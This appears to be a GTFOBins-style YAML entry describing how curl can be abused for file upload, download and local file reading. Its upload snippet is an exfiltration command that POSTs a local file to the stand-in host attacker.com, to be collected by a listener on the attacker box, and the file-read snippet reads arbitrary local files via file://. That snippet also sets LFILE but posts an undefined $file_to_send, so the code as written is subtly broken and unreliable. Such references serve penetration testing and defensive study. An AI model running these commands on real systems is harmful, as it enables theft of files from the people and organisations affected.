---
functions:
  upload:
    - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        URL=http://attacker.com/
        LFILE=file_to_send
        curl -X POST -d @$file_to_send $URL
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        curl $URL -o $LFILE
  file-read:
    - description: The file path must be absolute.
      code: |
        LFILE=/tmp/file_to_read
        curl file://$LFILE
---
